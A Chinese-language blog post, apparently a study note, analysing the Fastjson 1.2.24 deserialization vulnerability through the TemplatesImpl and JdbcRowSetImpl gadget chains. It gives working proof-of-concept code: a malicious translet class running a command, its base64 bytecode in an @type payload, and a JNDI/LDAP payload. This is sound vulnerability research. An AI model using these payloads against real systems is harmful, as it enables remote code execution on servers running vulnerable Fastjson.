+++
title = '初探Fastjson漏洞'
date = '2024-10-09T09:27:15+08:00'
categories = ['Java', '安全', '学习']
tags = ['java安全', '安全']
+++

## fastjson是什么

fastjson是阿里巴巴的开源的JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到Java Bean。

## 环境搭建

导入依赖 这里先演示 1.2.24

```java
        <dependency>
            <groupId>com.alibaba</groupId>
            <artifactId>fastjson</artifactId>
            <version>1.2.24</version>
        </dependency>
```

## Fastjson简单使用

新建一个类

```java
package top.foreverwl.study.fastjson.domain;

/**
 * @program: FastJson
 * @description:
 * @author: 168
 * @create: 2024-09-18 19:35
 **/
public class User {
    private String username;
    private int id ;

    public User(String username,int id) {
        System.out.println("有参构造");
        this.username = username;
        this.id = id;
    }


    @Override
    public String toString() {
        return "User{" +
                "username='" + username + '\'' +
                ", id=" + id +
                '}';
    }

    public String getUsername() {
        return username;
    }

    public void setUsername(String username) {
        this.username = username;
    }

    public int getId() {
        return id;
    }

    public void setId(int id) {
        this.id = id;
    }
}
```

JSON的toJSONString方法将指定的对象序列化为其等效的 Json 表示形式。我们看一个官方解释

![image-20240919150335722](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409191503793.png)

![image-20240919150354125](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409191503166.png)

我们写两个例子运行测试。

![image-20240919150442024](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409191504087.png)

可以看到第一个输出只有属性值的键值对，第二个可以看到多了一个参数SerializerFeature.WriteClassName，然后输出多了一个@type。

@type关键字标识是说明这个字符串是哪个类序列化而来的。传入`SerializerFeature.WriteClassName`可以使得Fastjson支持自省，开启自省后序列化成JSON的数据就会多一个@type，这个是代表对象类型的JSON文本。上边也就是指的User这个类型。

## JSON.parseObject和JSON.parse

先看一下代码，分析他们之间的区别。

![image-20240919194157395](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409191941468.png)

![image-20240919194210949](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409191942998.png)

JSON.parseObject方法中如果没有指定对象，返回的就是JSONObject对象。如果序列化字符串中有@type则会按照该类型进行反序列化，如果没有默认就返回JSONObject对象。当字符串中没有@type，还想反序列化为指定类型时候，就需要通过JSON.parseObject同时传入该类的class对象，就能反序列化成指定的对象类型。 
而使用JSON.parse方法，无法在在第二个参数中指定某个反序列化的类，它识别的是@type后指定的类。

使用`JSON.parse`方法反序列化会调用此类的set方法
使用`JSON.parseObject`方法反序列化会调用此类get和set方法

利用上边两个特征，演示一下。

危险类：![image-20240919202408402](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409192024475.png)

运行：![image-20240919202434683](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409192024778.png)

可以看到正好弹出了3个计算器，符合上边的特征。

## Fastjson反序列化漏洞成因

### Fastjson AutoType

先说明一下这个功能是干什么的。Fastjson 的 **AutoType** 功能是一个动态类型识别机制，允许在反序列化 JSON 数据时，根据 JSON 中的类型信息自动将其转换为相应的 Java 对象。AutoType 是为了支持多态反序列化（即父类引用指向子类对象）而设计的，能够在反序列化过程中识别并实例化 JSON 中指定的具体类。也就是确保要反序列的内容最终的类型。

### 漏洞成因

在序列化时，Fastjson会调用成员的get方法，被private修饰且没有get方法的成员不会被序列化。而在反序列化的时候，会调用指定类的全部的setter，public修饰的成员全部赋值。

漏洞就是利用fastjson Autotype在处理json对象的时候，未对@type字段进行完全的安全性验证，攻击者可以指定危险的类， 从而实现任意类的反序列化。

## TemplatesImpl链分析

TemplatesImpl位于com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl

![image-20241009152544473](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202410091525528.png)

首先漏洞利用点在`getTransletInstance()`这个方法中，在java动态类加载中，我们知道当调用newInstance时会自动调用该类中的静态代码块static{...}。这里调用了一次`newInstance`，我们如果能控制`_class[_transletIndex]`就能实现攻击，再看前面的条件，首先`_name_`不能为空，然后调用`defineTransletClasses()`方法，

![image-20240920172601730](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409201726796.png)

上边大概逻辑就是将`_bytecodes`的每一个元素放到`_class`中。关键来了，看for循环中：

![image-20240920173030321](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409201730364.png)

那么我们第一步分析的` _class[_transletIndex].newInstance()`就正好是接收了`_class`中的元素，也就是我们可以控制了。我们只需要伪造好`_bytecodes`,即可实现漏洞的利用(注意 这里_tfactory经过前面分析，也不能为null)。`_bytecodes`需要base64编码(在fastjson中，如果Field类型是byte数组，就会自动进行base64解码 调试时候也能看到)

我们现在往上找，看谁调用了`getTransletInstance()`。

![image-20240920173904233](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409201739280.png)

找到了`newTransformer()`继续往上找。
![image-20240920173958833](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409201739870.png)

在`getOutputProperties()`中调用了`newTransformer()`。也就是只要调用了`getOutputProperties()`就顺着链子完成了攻击。我们看一下这个`getOutputProperties()`

![image-20240920182917630](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409201829753.png)

会发现它其实就是`_outputProperties`中的`getter`方法

那么链子就出来了。

![image-20240920183352695](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409201833740.png)

### POC

首先写一个攻击类：

```java
package top.foreverwl.study.domain;
import java.io.IOException;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class eval extends AbstractTranslet  {
    static  {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}
```

然后将这个类编译为 .class文件。(这里注意 编译使用javac要和运行的java版本一样)

```java
javac file_path
```

将字节码文件输出为base64编码

```java
package top.foreverwl.study.demo;


import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.util.Base64;
import java.util.Base64.Encoder;
/**
 * @program: FastJson
 * @description:
 * @author: 168
 * @create: 2024-09-20 15:53
 **/
public class demo1 {

        public static void main(String args[]) {
            byte[] buffer = null;
            String filepath = "C:\\Users\\168\\Desktop\\java\\java安全\\FastJson2\\src\\main\\java\\top\\foreverwl\\study\\domain\\eval.class";
            try {
                FileInputStream fis = new FileInputStream(filepath);
                ByteArrayOutputStream bos = new ByteArrayOutputStream();
                byte[] b = new byte[1024];
                int n;
                while((n = fis.read(b))!=-1) {
                    bos.write(b,0,n);
                }
                fis.close();
                bos.close();
                buffer = bos.toByteArray();
            }catch(Exception e) {
                e.printStackTrace();
            }
            Encoder encoder = Base64.getEncoder();
            String value = encoder.encodeToString(buffer);
            System.out.println(value);
        }
}

```

运行测试：

```java
package top.foreverwl.study.demo;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
/**
 * @program: FastJson
 * @description: 运行测试
 * @author: 168
 * @create: 2024-09-18 19:34
 **/
public class TestRun {
    public static void main(String[] args) {

        String payload = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"_bytecodes\":	[\"yv66vgAAADQAKQoACQAYCgAZABoIABsKABkAHAcAHQcAHgoABgAfBwAgBwAhAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACIBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAdAQAKU291cmNlRmlsZQEACWV2YWwuamF2YQwACgALBwAjDAAkACUBAARjYWxjDAAmACcBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAAoAKAEAH3RvcC9mb3JldmVyd2wvc3R1ZHkvZG9tYWluL2V2YWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgAhAAgACQAAAAAABAABAAoACwABAAwAAAAdAAEAAQAAAAUqtwABsQAAAAEADQAAAAYAAQAAAAsAAQAOAA8AAgAMAAAAGQAAAAMAAAABsQAAAAEADQAAAAYAAQAAABgAEAAAAAQAAQARAAEADgASAAIADAAAABkAAAAEAAAAAbEAAAABAA0AAAAGAAEAAAAdABAAAAAEAAEAEQAIABMACwABAAwAAABUAAMAAQAAABe4AAISA7YABFenAA1LuwAGWSq3AAe/sQABAAAACQAMAAUAAgANAAAAFgAFAAAADwAJABIADAAQAA0AEQAWABMAFAAAAAcAAkwHABUJAAEAFgAAAAIAFw==\"], '_name':'c.c', '_tfactory':{ },\"_outputProperties\":{}, \"_name\":\"a\", \"_version\":\"1.0\", \"allowedProtocols\":\"all\"}";
        JSON.parseObject(payload, Feature.SupportNonPublicField);
    }
}
```

前面说过`_name`和`_tfactory`不能为空，这里随便赋值就行。这里`JSON.parseObject`使用`Feature.SupportNonPublicField`是因为`TemplatesImpl`中的成员变量都是private修饰的。在序列化时，`FastJson`会调用成员对应的`get`方法，被`private`修饰且没有`get`方法的成员不会被序列化，

## JdbcRowSetImpl链子

在图中：
![image-20241009151526798](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202410091515928.png)

当this.conn=null时候进入this.connect();中。而conn默认为null。跟进connect()

![image-20241009151753097](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202410091517138.png)

看到这里就能想到JNDI+LDAP了。

```java
        String payload2="{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/Calc\",\"autoCommit\":true}";
        JSON.parseObject(payload2, Feature.SupportNonPublicField);
```

里注意一点，jdk版本需要满足 8u161 < jdk < 8u191

